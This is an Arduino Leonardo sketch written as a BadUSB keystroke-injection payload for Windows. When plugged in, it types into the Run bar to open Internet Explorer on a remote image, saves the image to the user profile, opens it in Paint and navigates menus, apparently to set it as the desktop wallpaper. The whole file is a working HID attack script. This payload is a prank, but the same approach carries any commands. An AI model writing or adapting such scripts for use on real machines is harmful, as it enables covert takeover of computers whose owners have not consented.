#define kbd_es_es
#include <phukdlib_leonardo.h>

void setup() {
  Keyboard.begin();
}

void loop() {
  delay(5000);
  CommandAtRunBarMSWIN("iexplore http://s3.amazonaws.com/rapgenius/hotdog.jpg");
  delay(5000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('s');
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("%USERPROFILE%\\hotdog.jpg");
  delay(2000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('w');
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(2000);
  Keyboard.println("paint");
  delay(5000);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.println("%USERPROFILE%\\hotdog.jpg");
  delay(4000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press('f');
  delay(100);
  Keyboard.releaseAll();
  delay(3000);
  Keyboard.press(KEY_TAB);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_TAB);
  delay(100);
  Keyboard.releaseAll();
  delay(1000);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  while(1);
}
